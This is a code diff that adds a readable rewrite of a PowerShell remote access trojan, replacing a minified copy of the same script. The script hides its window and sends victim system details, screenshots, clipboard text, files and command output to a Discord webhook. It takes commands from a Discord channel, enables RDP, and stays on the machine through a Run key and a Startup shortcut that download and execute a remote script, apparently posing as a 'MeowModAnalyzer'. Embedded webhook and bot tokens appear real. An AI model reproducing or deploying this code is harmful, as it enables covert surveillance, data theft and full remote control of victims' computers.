@@ -1,1 +1,143 @@
-$w="https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI";$t="MTUxMjkxNzg2NTY0MzM3NjY2MA.Gd-iOn.qZxolXW_9yxxUcVU7oONt5QDM2rmtYVo1L0TuQ";$c="1512918078189731890";try{Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();'}[C.W]::ShowWindow([C.W]::GetConsoleWindow(),0)|Out-Null;function ds($x,$f,$e){$b=@{content=$x;username="MeowBot"};if($e){$b.embeds=@($e|ConvertFrom-Json)};if($f-and(Test-Path $f)){try{Add-Type -AssemblyName System.Net.Http;$cl=New-Object System.Net.Http.HttpClient;$ct=New-Object System.Net.Http.MultipartFormDataContent;$ct.Add((New-Object System.Net.Http.StringContent($b|ConvertTo-Json -Depth10 -Compress)),"payload_json");$fs=New-Object System.IO.FileStream($f,[System.IO.FileMode]::Open);$fc=New-Object System.Net.Http.StreamContent $fs;$ct.Add($fc,"file",[System.IO.Path]::GetFileName($f));$cl.PostAsync("$w?wait=true",$ct).Result|Out-Null;$cl.Dispose();$fs.Close()}catch{}}try{Invoke-RestMethod $w -Method Post -Body($b|ConvertTo-Json -Depth10)-ContentType "application/json" -ErrorAction SilentlyContinue|Out-Null}catch{}}function ssi{$p=$env:COMPUTERNAME;$u=$env:USERNAME;try{$o=(Get-CimInstance Win32_OperatingSystem).Caption}catch{$o="?"};try{$i=(Invoke-RestMethod "https://api.ipify.org" -ErrorAction SilentlyContinue)}catch{$i="?"};try{$k=(Get-CimInstance Win32_Processor).Name}catch{$k="?"};try{$r="{0:N2}GB"-f((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB)}catch{$r="?"};$e=@{title="New - $p";color=3066993;fields=@{name="PC";value=$p;inline=$true},@{name="User";value=$u;inline=$true},@{name="OS";value="$o";inline=$false},@{name="IP";value=$i;inline=$true},@{name="CPU";value="$k";inline=$false},@{name="RAM";value=$r;inline=$true}};ds "@everyone Hit!" -e ($e|ConvertTo-Json)};function ss($p){try{Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen;$b=$s.Bounds;$m=New-Object System.Drawing.Bitmap $b.Width,$b.Height;$g=[System.Drawing.Graphics]::FromImage($m);$g.CopyFromScreen($b.X,$b.Y,0,0,$b.Size);$g.Dispose();$m.Save($p,[System.Drawing.Imaging.ImageFormat]::Png);$m.Dispose();return$true}catch{return$false}};function ec($x){$t=[System.IO.Path]::GetTempFileName()+".txt";try{$r=Invoke-Expression $x 2>&1|Out-String;$r=if([string]::IsNullOrEmpty($r)){"[OK]"}else{$r};if($r.Length-gt1900){$r|Out-File $t -Encoding UTF8;ds "Output:" -f $t;Remove-Item $t -Force}else{ds "$r"}}catch{ds "Error: $($_.Exception.Message)"}};function ep{try{Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "Updater" "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`"" -ErrorAction SilentlyContinue}catch{};try{$s=[Environment]::GetFolderPath("Startup");$n=(New-Object -ComObject WScript.Shell).CreateShortcut("$s\Updater.lnk");$n.TargetPath="powershell.exe";$n.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`"";$n.WindowStyle=7;$n.Save()}catch{}};function h($x,$a){switch -Wildcard ($x.ToLower()){"!help"{ds "!screenshot !cmd !shell !download !upload !persist !info !exit !ipconfig !pslist !prockill !lock !msg !clipboard !rdp"};"!screenshot"{$p="$env:TEMP\s.png";if(ss $p){ds "Screen" -f $p;Remove-Item $p -Force}else{ds "Fail"}};"!cmd"{if($a){ec $a}else{ds "!cmd <cmd>"}};"!shell"{if($a){ec "cmd /c $a"}else{ds "!shell <cmd>"}};"!download"{if($a){$f=[System.IO.Path]::GetFileName($a);$d="$env:TEMP\$f";try{Invoke-WebRequest $a -OutFile $d;ds "DL: $f"}catch{ds "DL fail"}}else{ds "!download <url>"}};"!upload"{if($a-and(Test-Path $a)){ds "File" -f $a}else{ds "!upload <path>"}};"!persist"{ep;ds "Persist OK"};"!rdp"{try{Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0;Enable-NetFirewallRule -DisplayGroup "Remote Desktop";ds "RDP on"}catch{ds "RDP fail"}};"!info"{try{$p=$env:COMPUTERNAME;$u=$env:USERNAME;$o=(Get-CimInstance Win32_OperatingSystem).Caption;$i=(Invoke-RestMethod "https://api.ipify.org");$k=(Get-CimInstance Win32_Processor).Name;$r="{0:N2}GB"-f((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB)}catch{};$e=@{title="Info";color=3447003;fields=@{name="PC";value=$p;inline=$true},@{name="User";value=$u;inline=$true},@{name="OS";value="$o";inline=$false},@{name="IP";value=$i;inline=$true},@{name="CPU";value="$k";inline=$false},@{name="RAM";value=$r;inline=$true}};ds "Info" -e ($e|ConvertTo-Json)};"!exit"{ds "Bye";exit};"!ipconfig"{ec "ipconfig /all"};"!pslist"{ec "tasklist"};"!prockill"{if($a-and$a-match'^\d+$'){try{taskkill /PID $a /F;ds "Killed $a"}catch{ds "Fail"}}else{ds "!prockill <pid>"}};"!lock"{try{rundll32.exe user32.dll,LockWorkStation}catch{};ds "Locked"};"!msg"{if($a){try{Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show($a,"Msg")|Out-Null;ds "Msg OK"}catch{ds "Msg fail"}}else{ds "!msg <text>"}};"!clipboard"{try{Add-Type -AssemblyName System.Windows.Forms;$x=[System.Windows.Forms.Clipboard]::GetText();ds "Clip: $x"}catch{ds "Clip fail"}};default{ds "? Use !help"}}};ssi;ep;ds "Bot Ready!";$lid=$null;while(1){try{$m=Invoke-RestMethod "https://discord.com/api/v9/channels/$c/messages?limit=5" -Headers @{"Authorization"="Bot $t"} -ErrorAction SilentlyContinue;if($m){foreach($x in $m){if($lid-eq$null-or$x.id-gt$lid){if(!$x.author.bot-and$x.content-match'^!'){$p=$x.content-split' ',2;$a=if($p.Count-gt1){$p[1]}else{""};h $p[0] $a};$lid=$x.id}}}}catch{};sleep 3}
+$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
+$botToken = "MTUxMjkxNzg2NTY0MzM3NjY2MA.Gd-iOn.qZxolXW_9yxxUcVU7oONt5QDM2rmtYVo1L0TuQ"
+$channelId = "1512918078189731890"
+
+try {
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    '
+    [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
+} catch {}
+
+function SendMsg {
+    param([string]$Content, [string]$FilePath)
+    $body = @{content = $Content; username = "Agent"}
+    try {
+        if ($FilePath -and (Test-Path $FilePath)) {
+            Add-Type -AssemblyName System.Net.Http
+            $client = New-Object System.Net.Http.HttpClient
+            $form = New-Object System.Net.Http.MultipartFormDataContent
+            $form.Add((New-Object System.Net.Http.StringContent ($body | ConvertTo-Json -Depth 10 -Compress)), "payload_json")
+            $stream = New-Object System.IO.FileStream ($FilePath, [System.IO.FileMode]::Open)
+            $form.Add((New-Object System.Net.Http.StreamContent $stream), "file", [System.IO.Path]::GetFileName($FilePath))
+            $client.PostAsync("$webhookUrl?wait=true", $form).Result | Out-Null
+            $client.Dispose(); $stream.Close()
+            return
+        }
+    } catch {}
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+}
+
+function SendInfo {
+    $pc = $env:COMPUTERNAME
+    $user = $env:USERNAME
+    try { $os = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $os = "?" }
+    try { $ip = (Invoke-RestMethod "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $ip = "?" }
+    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "?" }
+    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "?" }
+    $embed = @{
+        title = "New Connection - $pc"
+        color = 3066993
+        fields = @(
+            @{name = "PC"; value = $pc; inline = $true},
+            @{name = "User"; value = $user; inline = $true},
+            @{name = "OS"; value = $os; inline = $false},
+            @{name = "IP"; value = $ip; inline = $true},
+            @{name = "CPU"; value = $cpu; inline = $false},
+            @{name = "RAM"; value = $ram; inline = $true}
+        )
+    }
+    SendMsg -Content "@everyone New victim!" -Embed ($embed | ConvertTo-Json)
+}
+
+function TakeScreen {
+    param([string]$Path)
+    try {
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
+        $graphics.Dispose()
+        $bitmap.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
+        $bitmap.Dispose()
+        return $true
+    } catch { return $false }
+}
+
+function RunCmd {
+    param([string]$Command)
+    try {
+        $result = Invoke-Expression $Command 2>&1 | Out-String
+        if ([string]::IsNullOrEmpty($result)) { $result = "[OK]" }
+        if ($result.Length -gt 1900) {
+            $tmp = [System.IO.Path]::GetTempFileName() + ".txt"
+            $result | Out-File $tmp -Encoding UTF8
+            SendMsg -Content "Output:" -FilePath $tmp
+            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+        } else {
+            SendMsg -Content $result
+        }
+    } catch { SendMsg -Content "Error: $($_.Exception.Message)" }
+}
+
+function AddPersist {
+    $cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
+    try { Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "Updater" $cmd -ErrorAction SilentlyContinue } catch {}
+    try {
+        $s = [Environment]::GetFolderPath("Startup")
+        $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$s\Updater.lnk")
+        $lnk.TargetPath = "powershell.exe"; $lnk.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""; $lnk.WindowStyle = 7; $lnk.Save()
+    } catch {}
+}
+
+function HandleCmd {
+    param([string]$Cmd, [string]$Args)
+    switch ($Cmd.ToLower()) {
+        "!help" { SendMsg -Content "Commands: !screenshot !cmd !shell !download !upload !persist !rdp !info !exit !ipconfig !pslist !prockill !lock !msg !clipboard" }
+        "!screenshot" { $p = "$env:TEMP\ss.png"; if (TakeScreen $p) { SendMsg -Content "Screenshot:" -FilePath $p; Remove-Item $p -Force -ErrorAction SilentlyContinue } else { SendMsg -Content "SS failed" } }
+        "!cmd" { if ($Args) { RunCmd $Args } else { SendMsg -Content "Usage: !cmd <command>" } }
+        "!shell" { if ($Args) { RunCmd "cmd /c $Args" } else { SendMsg -Content "Usage: !shell <command>" } }
+        "!download" { if ($Args) { $f = [System.IO.Path]::GetFileName($Args); try { Invoke-WebRequest $Args -OutFile "$env:TEMP\$f"; SendMsg -Content "Downloaded: $f" } catch { SendMsg -Content "DL failed" } } else { SendMsg -Content "Usage: !download <url>" } }
+        "!upload" { if ($Args -and (Test-Path $Args)) { SendMsg -Content "File:" -FilePath $Args } else { SendMsg -Content "Usage: !upload <path>" } }
+        "!persist" { AddPersist; SendMsg -Content "Persistence ON" }
+        "!rdp" { try { Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"; SendMsg -Content "RDP enabled" } catch { SendMsg -Content "RDP failed" } }
+        "!info" { SendInfo }
+        "!exit" { SendMsg -Content "Bye!"; exit }
+        "!ipconfig" { RunCmd "ipconfig /all" }
+        "!pslist" { RunCmd "tasklist" }
+        "!prockill" { if ($Args -match '^\d+$') { try { taskkill /PID $Args /F; SendMsg -Content "Killed PID $Args" } catch { SendMsg -Content "Kill failed" } } else { SendMsg -Content "Usage: !prockill <pid>" } }
+        "!lock" { try { rundll32.exe user32.dll,LockWorkStation } catch {}; SendMsg -Content "Locked" }
+        "!msg" { if ($Args) { try { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($Args, "Message") | Out-Null; SendMsg -Content "Msg shown" } catch { SendMsg -Content "Msg failed" } } else { SendMsg -Content "Usage: !msg <text>" } }
+        "!clipboard" { try { Add-Type -AssemblyName System.Windows.Forms; $x = [System.Windows.Forms.Clipboard]::GetText(); SendMsg -Content "Clipboard: $x" } catch { SendMsg -Content "Clipboard failed" } }
+        default { SendMsg -Content "Unknown command. Use !help" }
+    }
+}
+
+# Main
+SendInfo
+AddPersist
+SendMsg -Content "Agent Ready! Listening..."
+
+# Polling loop
+$lastId = $null
+while ($true) {
+    try {
+        $msgs = Invoke-RestMethod "https://discord.com/api/v9/channels/$channelId/messages?limit=5" -Headers @{"Authorization" = "Bot $botToken"} -ErrorAction SilentlyContinue
+        if ($msgs) {
+            foreach ($m in $msgs) {
+                if (($lastId -eq $null -or $m.id -gt $lastId) -and !$m.author.bot -and $m.content -match '^!') {
+                    $parts = $m.content -split ' ', 2
+                    $cmd = $parts[0]
+                    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
+                    HandleCmd -Cmd $cmd -Args $args
+                    $lastId = $m.id
+                }
+            }
+        }
+    } catch {}
+    Start-Sleep -Seconds 3
+}
